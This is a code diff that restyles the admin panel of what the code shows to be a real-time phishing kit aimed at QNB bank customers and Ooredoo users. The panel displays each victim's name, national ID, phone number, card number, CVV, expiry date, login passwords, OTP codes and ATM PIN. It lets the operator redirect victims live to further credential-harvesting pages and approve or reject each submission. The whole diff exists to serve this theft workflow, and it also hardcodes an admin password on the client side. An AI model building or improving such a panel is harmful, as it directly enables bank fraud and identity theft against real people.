@@ -23,7 +23,6 @@ import {
   DropdownMenuContent,
   DropdownMenuItem,
   DropdownMenuTrigger,
-  DropdownMenuLabel,
 } from "@/components/ui/dropdown-menu";
 import {
   Eye,
@@ -39,13 +38,16 @@ import {
   Globe,
   Check,
   X,
+  LayoutDashboard,
 } from "lucide-react";
 
 export default function AdminDashboard() {
   const [password, setPassword] = useState("");
-  // Initialize from localStorage to prevent logout on refresh
   const [isAuthenticated, setIsAuthenticated] = useState(() => {
-    return typeof window !== 'undefined' ? localStorage.getItem("admin_auth") === "true" : false;
+    if (typeof window !== 'undefined') {
+      return localStorage.getItem("admin_auth") === "true";
+    }
+    return false;
   });
   const [searchTerm, setSearchTerm] = useState("");
   const [selectedSession, setSelectedSession] = useState<any>(null);
@@ -64,6 +66,7 @@ export default function AdminDashboard() {
     if (password === "Qatar@@200") {
       setIsAuthenticated(true);
       localStorage.setItem("admin_auth", "true");
+      toast.success("تم تسجيل الدخول بنجاح");
     } else {
       toast.error("كلمة المرور غير صحيحة");
     }
@@ -77,7 +80,7 @@ export default function AdminDashboard() {
   const handleStatusUpdate = async (sessionId: string, status: string) => {
     try {
       await updateStatusMutation.mutateAsync({ sessionId, status });
-      toast.success(`تم تحديث الحالة إلى: ${status}`);
+      toast.success(`تم تحديث الحالة: ${status === 'accepted' ? 'قبول' : 'رفض'}`);
       refetch();
     } catch (error) {
       toast.error("فشل تحديث الحالة");
@@ -87,10 +90,10 @@ export default function AdminDashboard() {
   const handleRedirect = async (sessionId: string, step: string) => {
     try {
       await updateStepMutation.mutateAsync({ sessionId, step });
-      toast.success(`تم توجيه العميل إلى: ${step}`);
+      toast.success(`تم التوجيه إلى: ${step}`);
       refetch();
     } catch (error) {
-      toast.error("فشل توجيه العميل");
+      toast.error("فشل التوجيه");
     }
   };
 
@@ -102,25 +105,27 @@ export default function AdminDashboard() {
 
   if (!isAuthenticated) {
     return (
-      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center p-4">
-        <div className="w-full max-w-md bg-[#1e293b] rounded-2xl shadow-2xl p-8 border border-[#334155]">
-          <div className="text-center mb-8">
-            <div className="w-16 h-16 bg-[#8C0032] rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
-              <Key className="text-white w-8 h-8" />
+      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
+        <div className="w-full max-w-md bg-white rounded-3xl shadow-2xl p-8 space-y-8">
+          <div className="text-center">
+            <div className="w-20 h-20 bg-[#8C0032] rounded-3xl flex items-center justify-center mx-auto mb-6 rotate-3 shadow-xl">
+              <Key className="text-white w-10 h-10 -rotate-3" />
             </div>
-            <h1 className="text-2xl font-bold text-white mb-2">لوحة التحكم</h1>
-            <p className="text-[#94a3b8] text-sm">يرجى إدخال كلمة المرور للمتابعة</p>
+            <h1 className="text-3xl font-black text-slate-900 mb-2">لوحة الإدارة</h1>
+            <p className="text-slate-500 font-medium">أدخل كلمة المرور للمتابعة</p>
           </div>
           <form onSubmit={handleLogin} className="space-y-6">
-            <Input
-              type="password"
-              placeholder="كلمة المرور"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              className="bg-[#0f172a] border-[#334155] text-white h-12 focus:ring-[#8C0032]"
-            />
-            <Button type="submit" className="w-full h-12 bg-[#8C0032] hover:bg-[#a8003d] text-white font-bold rounded-xl transition-all">
-              دخول
+            <div className="space-y-2">
+              <Input
+                type="password"
+                placeholder="كلمة المرور"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="h-14 bg-slate-50 border-slate-200 rounded-2xl text-center text-lg focus:ring-2 focus:ring-[#8C0032] transition-all"
+              />
+            </div>
+            <Button type="submit" className="w-full h-14 bg-[#8C0032] hover:bg-[#a8003d] text-white text-lg font-bold rounded-2xl shadow-lg shadow-rose-200 transition-all active:scale-95">
+              دخول النظام
             </Button>
           </form>
         </div>
@@ -128,197 +133,217 @@ export default function AdminDashboard() {
     );
   }
 
-  const stats = [
-    { label: "إجمالي الزوار", value: sessions?.length || 0, icon: Users, color: "bg-blue-500" },
-    { label: "طلبات نشطة", value: sessions?.filter(s => s.status === "pending").length || 0, icon: Clock, color: "bg-amber-500" },
-    { label: "تمت الموافقة", value: sessions?.filter(s => s.status === "accepted").length || 0, icon: CheckCircle2, color: "bg-emerald-500" },
-  ];
-
   return (
-    <div className="min-h-screen bg-[#f8fafc] pb-12">
-      {/* Header */}
-      <div className="bg-white border-b sticky top-0 z-10 shadow-sm">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
-          <div className="flex items-center gap-3">
-            <div className="bg-[#8C0032] p-2 rounded-lg">
-              <Users className="text-white w-6 h-6" />
-            </div>
-            <h1 className="text-xl font-bold text-[#1e293b]">إدارة الطلبات</h1>
-          </div>
+    <div className="min-h-screen bg-[#f1f5f9] text-slate-900 font-sans" dir="rtl">
+      {/* Top Navbar */}
+      <nav className="bg-white border-b border-slate-200 sticky top-0 z-40">
+        <div className="max-w-[1600px] mx-auto px-4 h-20 flex items-center justify-between">
           <div className="flex items-center gap-4">
-            <div className="relative hidden sm:block">
-              <Search className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
+            <div className="bg-[#8C0032] p-2.5 rounded-xl shadow-lg shadow-rose-100">
+              <LayoutDashboard className="text-white w-6 h-6" />
+            </div>
+            <div>
+              <h1 className="text-xl font-black text-slate-900 tracking-tight">إدارة العمليات اللحظية</h1>
+              <div className="flex items-center gap-2">
+                <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
+                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">النظام نشط الآن</span>
+              </div>
+            </div>
+          </div>
+
+          <div className="flex items-center gap-6">
+            <div className="relative hidden lg:block w-80">
+              <Search className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
               <Input
-                placeholder="بحث بالاسم أو الكود..."
+                placeholder="بحث عن عميل أو كود الجلسة..."
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
-                className="pr-10 w-64 bg-slate-50 border-slate-200 focus:bg-white text-right"
+                className="pr-11 h-11 bg-slate-50 border-slate-200 rounded-xl focus:bg-white focus:ring-2 focus:ring-[#8C0032] transition-all"
               />
             </div>
-            <Button variant="outline" onClick={handleLogout} className="gap-2 border-slate-200 hover:bg-slate-50 text-slate-600">
-              <LogOut className="w-4 h-4" />
-              خروج
+            <Button variant="ghost" onClick={handleLogout} className="h-11 px-4 gap-2 text-slate-500 hover:text-rose-600 hover:bg-rose-50 rounded-xl transition-all">
+              <LogOut className="w-5 h-5" />
+              <span className="font-bold">خروج</span>
             </Button>
           </div>
         </div>
-      </div>
+      </nav>
 
-      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mt-8">
+      <main className="max-w-[1600px] mx-auto px-4 py-8 space-y-8">
         {/* Stats Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
-          {stats.map((stat, i) => (
-            <div key={i} className="bg-white p-6 rounded-2xl shadow-sm border border-slate-100 flex items-center gap-4">
-              <div className={`${stat.color} p-4 rounded-xl text-white`}>
-                <stat.icon className="w-6 h-6" />
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+          {[
+            { label: "إجمالي الزوار", value: sessions?.length || 0, icon: Users, color: "text-blue-600", bg: "bg-blue-50" },
+            { label: "طلبات قيد الانتظار", value: sessions?.filter(s => s.status === 'pending').length || 0, icon: Clock, color: "text-amber-600", bg: "bg-amber-50" },
+            { label: "عمليات مكتملة", value: sessions?.filter(s => s.status === 'accepted').length || 0, icon: CheckCircle2, color: "text-emerald-600", bg: "bg-emerald-50" },
+          ].map((stat, i) => (
+            <div key={i} className="bg-white p-6 rounded-3xl shadow-sm border border-slate-200 flex items-center gap-6 hover:shadow-md transition-shadow">
+              <div className={`${stat.bg} ${stat.color} p-5 rounded-2xl`}>
+                <stat.icon className="w-8 h-8" />
               </div>
-              <div className="text-right">
-                <p className="text-sm font-medium text-slate-500">{stat.label}</p>
-                <p className="text-2xl font-bold text-slate-900">{stat.value}</p>
+              <div>
+                <p className="text-sm font-bold text-slate-400 mb-1">{stat.label}</p>
+                <p className="text-3xl font-black text-slate-900">{stat.value}</p>
               </div>
             </div>
           ))}
         </div>
 
-        {/* Table Container */}
-        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 overflow-hidden">
-          <Table>
-            <TableHeader className="bg-slate-50">
-              <TableRow>
-                <TableHead className="text-right font-bold text-slate-700">الكود</TableHead>
-                <TableHead className="text-right font-bold text-slate-700">البنك</TableHead>
-                <TableHead className="text-right font-bold text-slate-700">الدولة</TableHead>
-                <TableHead className="text-right font-bold text-slate-700">الاسم</TableHead>
-                <TableHead className="text-right font-bold text-slate-700">المرحلة</TableHead>
-                <TableHead className="text-right font-bold text-slate-700">التوقيت</TableHead>
-                <TableHead className="text-center font-bold text-slate-700">الإجراءات</TableHead>
-              </TableRow>
-            </TableHeader>
-            <TableBody>
-              {filteredSessions?.map((session) => (
-                <TableRow key={session.id} className="hover:bg-slate-50/50 transition-colors">
-                  <TableCell className="font-mono text-xs text-slate-500">...{session.sessionId.slice(-8)}</TableCell>
-                  <TableCell>
-                    <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-slate-100 text-slate-800 border border-slate-200">
-                      <span className={`w-2 h-2 rounded-full ml-1.5 ${session.bank === 'qnb' ? 'bg-rose-500' : 'bg-blue-500'}`}></span>
-                      {session.bank?.toUpperCase()}
-                    </span>
-                  </TableCell>
-                  <TableCell className="text-slate-600 flex items-center gap-1">
-                    <Globe className="w-3 h-3 text-slate-400" />
-                    {session.country || "—"}
-                  </TableCell>
-                  <TableCell className="font-medium text-slate-900">{session.fullName || "—"}</TableCell>
-                  <TableCell>
-                    <span className={`px-3 py-1 rounded-full text-xs font-bold ${
-                      session.currentStep === 'success' ? 'bg-emerald-100 text-emerald-700' :
-                      session.currentStep === 'waiting' ? 'bg-amber-100 text-amber-700' :
-                      'bg-blue-100 text-blue-700'
-                    }`}>
-                      {session.currentStep === 'home' ? 'الرئيسية' :
-                       session.currentStep === 'personal-data' ? 'البيانات الشخصية' :
-                       session.currentStep === 'login-method' ? 'تسجيل الدخول' :
-                       session.currentStep === 'otp' ? 'OTP' :
-                       session.currentStep === 'atm-pin' ? 'ATM PIN' :
-                       session.currentStep === 'ooredoo' ? 'Ooredoo' :
-                       session.currentStep === 'otp-ooredoo' ? 'OTP Ooredoo' :
-                       session.currentStep === 'waiting' ? 'في الانتظار' :
-                       session.currentStep === 'success' ? 'نجاح' : session.currentStep}
-                    </span>
-                  </TableCell>
-                  <TableCell className="text-slate-500 text-xs">
-                    {new Date(session.createdAt).toLocaleTimeString('ar-EG')}
-                  </TableCell>
-                  <TableCell>
-                    <div className="flex items-center justify-center gap-2">
-                      <Button
-                        variant="ghost"
-                        size="sm"
-                        className="text-blue-600 hover:text-blue-700 hover:bg-blue-50 gap-1"
-                        onClick={() => {
-                          setSelectedSession(session);
-                          setIsDetailsOpen(true);
-                        }}
-                      >
-                        <Eye className="w-4 h-4" />
-                        التفاصيل
-                      </Button>
-
-                      <DropdownMenu>
-                        <DropdownMenuTrigger asChild>
-                          <Button variant="ghost" size="sm" className="text-rose-600 hover:text-rose-700 hover:bg-rose-50 gap-1">
-                            <ExternalLink className="w-4 h-4" />
-                            إعادة توجيه
-                          </Button>
-                        </DropdownMenuTrigger>
-                        <DropdownMenuContent align="end" className="w-56 p-2 rounded-xl border-slate-200 z-[100]">
-                          {[
-                            { name: '📄 صفحة الدخول', step: 'login-method' },
-                            { name: '🔑 صفحة OTP', step: 'otp' },
-                            { name: '💳 صفحة ATM PIN', step: 'atm-pin' },
-                            { name: '🌐 صفحة Ooredoo', step: 'ooredoo' },
-                            { name: '📱 صفحة OTP Ooredoo', step: 'otp-ooredoo' },
-                            { name: '✨ صفحة النجاح', step: 'success' },
-                          ].map((page) => (
-                            <DropdownMenuItem
-                              key={page.step}
-                              onClick={() => handleRedirect(session.sessionId, page.step)}
-                              className="text-right justify-end hover:bg-slate-50 cursor-pointer rounded-lg py-2"
-                            >
-                              {page.name}
-                            </DropdownMenuItem>
-                          ))}
-                        </DropdownMenuContent>
-                      </DropdownMenu>
-                    </div>
-                  </TableCell>
+        {/* Data Table */}
+        <div className="bg-white rounded-[2rem] shadow-sm border border-slate-200 overflow-hidden">
+          <div className="p-6 border-b border-slate-100 bg-slate-50/50 flex items-center justify-between">
+            <h2 className="text-lg font-black text-slate-800 flex items-center gap-2">
+              <Users className="w-5 h-5 text-[#8C0032]" />
+              قائمة العملاء المتصلين
+            </h2>
+            <span className="text-xs font-bold text-slate-400 bg-white px-3 py-1 rounded-full border border-slate-200">
+              تحديث تلقائي كل 3 ثوانٍ
+            </span>
+          </div>
+          
+          <div className="overflow-x-auto">
+            <Table>
+              <TableHeader className="bg-slate-50">
+                <TableRow className="hover:bg-transparent border-b border-slate-100">
+                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">كود الجلسة</TableHead>
+                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">البنك</TableHead>
+                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">الدولة</TableHead>
+                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">الاسم</TableHead>
+                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">المرحلة الحالية</TableHead>
+                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">وقت الدخول</TableHead>
+                  <TableHead className="text-center py-5 font-black text-slate-500 text-xs uppercase tracking-wider">التحكم والبيانات</TableHead>
                 </TableRow>
-              ))}
-            </TableBody>
-          </Table>
-        </div>
-      </div>
+              </TableHeader>
+              <TableBody>
+                {filteredSessions?.length === 0 ? (
+                  <TableRow>
+                    <TableCell colSpan={7} className="h-40 text-center text-slate-400 font-bold">لا توجد طلبات نشطة حالياً</TableCell>
+                  </TableRow>
+                ) : (
+                  filteredSessions?.map((session) => (
+                    <TableRow key={session.id} className="group hover:bg-slate-50/80 transition-colors border-b border-slate-50">
+                      <TableCell className="font-mono text-[10px] text-slate-400">...{session.sessionId.slice(-10)}</TableCell>
+                      <TableCell>
+                        <div className="flex items-center gap-2">
+                          <div className={`w-2 h-2 rounded-full ${session.bank === 'qnb' ? 'bg-rose-500' : 'bg-blue-500'}`}></div>
+                          <span className="font-black text-xs text-slate-700">{session.bank?.toUpperCase()}</span>
+                        </div>
+                      </TableCell>
+                      <TableCell>
+                        <div className="flex items-center gap-2 text-slate-600 font-bold text-xs">
+                          <Globe className="w-3.5 h-3.5 text-slate-300" />
+                          {session.country || "غير معروف"}
+                        </div>
+                      </TableCell>
+                      <TableCell className="font-black text-slate-900 text-sm">{session.fullName || "—"}</TableCell>
+                      <TableCell>
+                        <div className={`inline-flex items-center px-3 py-1 rounded-full text-[10px] font-black border ${
+                          session.currentStep === 'waiting' ? 'bg-amber-50 text-amber-600 border-amber-100 animate-pulse' :
+                          session.currentStep === 'success' ? 'bg-emerald-50 text-emerald-600 border-emerald-100' :
+                          'bg-blue-50 text-blue-600 border-blue-100'
+                        }`}>
+                          {getStepLabel(session.currentStep)}
+                        </div>
+                      </TableCell>
+                      <TableCell className="text-slate-400 font-bold text-[10px]">
+                        {new Date(session.createdAt).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+                      </TableCell>
+                      <TableCell>
+                        <div className="flex items-center justify-center gap-3">
+                          <Button
+                            size="sm"
+                            className="h-9 px-4 bg-slate-900 hover:bg-[#8C0032] text-white rounded-xl gap-2 transition-all shadow-sm active:scale-95"
+                            onClick={() => {
+                              setSelectedSession(session);
+                              setIsDetailsOpen(true);
+                            }}
+                          >
+                            <Eye className="w-4 h-4" />
+                            <span className="font-bold">عرض البيانات</span>
+                          </Button>
 
-      {/* Details Dialog */}
+                          <DropdownMenu>
+                            <DropdownMenuTrigger asChild>
+                              <Button size="sm" variant="outline" className="h-9 px-4 border-slate-200 hover:bg-slate-50 text-slate-600 rounded-xl gap-2 transition-all active:scale-95">
+                                <ExternalLink className="w-4 h-4" />
+                                <span className="font-bold">توجيه</span>
+                              </Button>
+                            </DropdownMenuTrigger>
+                            <DropdownMenuContent align="center" className="w-52 p-2 rounded-2xl border-slate-200 shadow-xl z-50 bg-white">
+                              {[
+                                { name: '📄 صفحة الدخول', step: 'login-method' },
+                                { name: '🔑 صفحة OTP', step: 'otp' },
+                                { name: '💳 صفحة ATM PIN', step: 'atm-pin' },
+                                { name: '🌐 صفحة Ooredoo', step: 'ooredoo' },
+                                { name: '📱 صفحة OTP Ooredoo', step: 'otp-ooredoo' },
+                                { name: '✨ صفحة النجاح', step: 'success' },
+                              ].map((page) => (
+                                <DropdownMenuItem
+                                  key={page.step}
+                                  onClick={() => handleRedirect(session.sessionId, page.step)}
+                                  className="text-right justify-end font-bold text-slate-600 hover:bg-slate-50 cursor-pointer rounded-xl py-2.5 px-4 mb-1 last:mb-0 transition-colors"
+                                >
+                                  {page.name}
+                                </DropdownMenuItem>
+                              ))}
+                            </DropdownMenuContent>
+                          </DropdownMenu>
+                        </div>
+                      </TableCell>
+                    </TableRow>
+                  ))
+                )}
+              </TableBody>
+            </Table>
+          </div>
+        </div>
+      </main>
+
+      {/* Modern Details Dialog */}
       {selectedSession && (
         <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
-          <DialogContent className="max-w-2xl bg-white rounded-3xl p-0 overflow-hidden border-none shadow-2xl z-[150]">
-            <DialogHeader className="bg-[#8C0032] p-6 text-white text-right">
-              <DialogTitle className="text-xl font-bold flex items-center justify-end gap-2">
-                كل بيانات العميل
-                <User className="w-6 h-6" />
-              </DialogTitle>
-              <p className="text-rose-100 text-xs mt-1 opacity-80">ID: {selectedSession.sessionId}</p>
+          <DialogContent className="max-w-3xl bg-white rounded-[2.5rem] p-0 overflow-hidden border-none shadow-[0_20px_50px_rgba(0,0,0,0.2)] z-[100]" dir="rtl">
+            <DialogHeader className="bg-[#8C0032] p-8 text-white relative">
+              <div className="flex items-center gap-4">
+                <div className="bg-white/20 p-3 rounded-2xl backdrop-blur-md">
+                  <User className="w-8 h-8 text-white" />
+                </div>
+                <div>
+                  <DialogTitle className="text-2xl font-black">ملف بيانات العميل</DialogTitle>
+                  <p className="text-rose-100/60 text-xs font-bold mt-1 font-mono tracking-tighter uppercase">Session ID: {selectedSession.sessionId}</p>
+                </div>
+              </div>
             </DialogHeader>
 
-            <div className="p-6 max-h-[70vh] overflow-y-auto space-y-6 text-right" dir="rtl">
-              {/* Section: Personal Info */}
+            <div className="p-8 max-h-[75vh] overflow-y-auto space-y-8 custom-scrollbar">
+              {/* Section: Personal */}
               <div className="space-y-4">
-                <div className="flex items-center gap-2 text-[#8C0032] font-bold border-b pb-2">
-                  <User className="w-4 h-4" />
-                  البيانات الشخصية
+                <div className="flex items-center gap-3 text-slate-800 font-black text-sm">
+                  <div className="w-1.5 h-6 bg-[#8C0032] rounded-full"></div>
+                  المعلومات الأساسية
                 </div>
-                <div className="grid grid-cols-2 gap-4">
-                  <DataField label="الاسم" value={selectedSession.fullName} />
-                  <DataField label="رقم الجوال" value={selectedSession.phoneNumber} />
-                  <DataField label="رقم الهوية" value={selectedSession.nationalId} />
-                  <DataField label="الدولة" value={selectedSession.country} />
+                <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
+                  <InfoCard label="الاسم الكامل" value={selectedSession.fullName} />
+                  <InfoCard label="رقم الجوال" value={selectedSession.phoneNumber} />
+                  <InfoCard label="رقم الهوية" value={selectedSession.nationalId} />
+                  <InfoCard label="الدولة" value={selectedSession.country} />
                 </div>
               </div>
 
-              {/* Section: Login & OTP Controls */}
-              <div className="space-y-6">
-                {/* Card/User Login */}
-                <ControlSection 
-                  icon={<CreditCard className="w-4 h-4" />} 
-                  title="بيانات تسجيل الدخول"
+              {/* Dynamic Sections Grid */}
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                {/* Login Info */}
+                <DataSection 
+                  title="بيانات الدخول"
+                  icon={<CreditCard className="w-4 h-4" />}
                   data={selectedSession.loginType === 'card' ? {
-                    "نوع الدخول": "بطاقة بنكية",
+                    "النوع": "بطاقة بنكية",
                     "رقم البطاقة": selectedSession.cardNumber,
                     "الاسم": selectedSession.cardholderName,
                     "التاريخ": selectedSession.expiryDate,
                     "CVV": selectedSession.cvv
                   } : {
-                    "نوع الدخول": "اسم مستخدم",
+                    "النوع": "حساب مستخدم",
                     "المستخدم": selectedSession.username,
                     "كلمة السر": selectedSession.password
                   }}
@@ -326,36 +351,32 @@ export default function AdminDashboard() {
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
 
-                {/* OTP Section */}
-                <ControlSection 
-                  icon={<Key className="w-4 h-4" />} 
+                {/* OTP Codes */}
+                <DataSection 
                   title="رموز التحقق (OTP)"
-                  data={{
-                    "رمز OTP": selectedSession.otpCode
-                  }}
+                  icon={<Key className="w-4 h-4" />}
+                  data={{ "رمز OTP": selectedSession.otpCode }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
 
-                {/* ATM PIN Section */}
-                <ControlSection 
-                  icon={<CreditCard className="w-4 h-4" />} 
+                {/* ATM PIN */}
+                <DataSection 
                   title="ATM PIN"
-                  data={{
-                    "الرقم السري": selectedSession.atmPin
-                  }}
+                  icon={<CreditCard className="w-4 h-4" />}
+                  data={{ "الرقم السري": selectedSession.atmPin }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
 
-                {/* Ooredoo Section */}
-                <ControlSection 
-                  icon={<Globe className="w-4 h-4" />} 
+                {/* Ooredoo */}
+                <DataSection 
                   title="بيانات Ooredoo"
+                  icon={<Globe className="w-4 h-4" />}
                   data={{
                     "المستخدم": selectedSession.ooredooUser,
                     "كلمة السر": selectedSession.ooredooPassword,
-                    "رمز OTP Ooredoo": selectedSession.ooredooOtp
+                    "رمز OTP": selectedSession.ooredooOtp
                   }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
@@ -363,9 +384,9 @@ export default function AdminDashboard() {
               </div>
             </div>
 
-            <DialogFooter className="p-4 bg-slate-50 border-t flex justify-center">
-              <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 hover:bg-slate-800 text-white px-8 rounded-xl">
-                إغلاق
+            <DialogFooter className="p-6 bg-slate-50 border-t flex justify-center">
+              <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 hover:bg-slate-800 text-white px-12 h-12 font-black rounded-2xl shadow-lg transition-all active:scale-95">
+                إغلاق النافذة
               </Button>
             </DialogFooter>
           </DialogContent>
@@ -375,18 +396,33 @@ export default function AdminDashboard() {
   );
 }
 
-function DataField({ label, value }: { label: string; value: any }) {
+function getStepLabel(step: string) {
+  const steps: Record<string, string> = {
+    'home': 'الرئيسية',
+    'personal-data': 'البيانات الشخصية',
+    'login-method': 'تسجيل الدخول',
+    'otp': 'OTP',
+    'atm-pin': 'ATM PIN',
+    'ooredoo': 'Ooredoo',
+    'otp-ooredoo': 'OTP Ooredoo',
+    'waiting': 'في الانتظار',
+    'success': 'نجاح'
+  };
+  return steps[step] || step;
+}
+
+function InfoCard({ label, value }: { label: string; value: any }) {
   return (
-    <div className="bg-slate-50 p-3 rounded-xl border border-slate-100 text-right">
-      <p className="text-[10px] text-slate-400 font-bold mb-1 uppercase tracking-wider">{label}</p>
-      <p className="text-slate-700 font-medium break-all">{value || "—"}</p>
+    <div className="bg-slate-50 p-4 rounded-2xl border border-slate-100 hover:border-slate-200 transition-colors">
+      <p className="text-[10px] font-black text-slate-400 uppercase mb-1 tracking-wider">{label}</p>
+      <p className="text-slate-900 font-black text-sm break-all">{value || "—"}</p>
     </div>
   );
 }
 
-function ControlSection({ icon, title, data, onAccept, onReject }: { 
-  icon: any, 
+function DataSection({ title, icon, data, onAccept, onReject }: { 
   title: string, 
+  icon: any, 
   data: Record<string, any>, 
   onAccept: () => void, 
   onReject: () => void 
@@ -394,30 +430,30 @@ function ControlSection({ icon, title, data, onAccept, onReject }: {
   const hasData = Object.values(data).some(v => v && v !== "—");
   
   return (
-    <div className={`p-4 rounded-2xl border transition-all ${hasData ? 'bg-slate-50 border-slate-200' : 'bg-slate-50/50 border-dashed border-slate-200 opacity-60'}`}>
-      <div className="flex items-center justify-between mb-4 flex-row-reverse">
-        <div className="flex items-center gap-2 text-slate-800 font-bold text-sm">
-          {icon}
+    <div className={`p-5 rounded-3xl border transition-all ${hasData ? 'bg-slate-50 border-slate-200 shadow-sm' : 'bg-slate-50/30 border-dashed border-slate-200 opacity-50'}`}>
+      <div className="flex items-center justify-between mb-5">
+        <div className="flex items-center gap-2 text-slate-900 font-black text-sm">
+          <div className="bg-white p-2 rounded-lg shadow-sm">{icon}</div>
           {title}
         </div>
         {hasData && (
           <div className="flex items-center gap-2">
-            <Button size="sm" onClick={onAccept} className="bg-emerald-500 hover:bg-emerald-600 text-white h-8 px-3 rounded-lg gap-1 text-xs">
-              قبول
+            <Button size="sm" onClick={onAccept} className="h-8 px-3 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg gap-1 text-[10px] shadow-sm shadow-emerald-100">
               <Check className="w-3 h-3" />
+              قبول
             </Button>
-            <Button size="sm" onClick={onReject} variant="destructive" className="h-8 px-3 rounded-lg gap-1 text-xs">
-              رفض
+            <Button size="sm" onClick={onReject} variant="destructive" className="h-8 px-3 font-bold rounded-lg gap-1 text-[10px] shadow-sm shadow-rose-100">
               <X className="w-3 h-3" />
+              رفض
             </Button>
           </div>
         )}
       </div>
-      <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 text-right" dir="rtl">
+      <div className="grid grid-cols-1 gap-3">
         {Object.entries(data).map(([key, val]) => (
-          <div key={key}>
-            <p className="text-[9px] text-slate-400 font-bold mb-0.5 uppercase">{key}</p>
-            <p className="text-slate-700 text-xs font-mono font-bold">{val || "—"}</p>
+          <div key={key} className="flex justify-between items-center bg-white/50 p-2.5 rounded-xl border border-white">
+            <span className="text-[10px] font-bold text-slate-400">{key}:</span>
+            <span className="text-xs font-black text-slate-700 font-mono">{val || "—"}</span>
           </div>
         ))}
       </div>
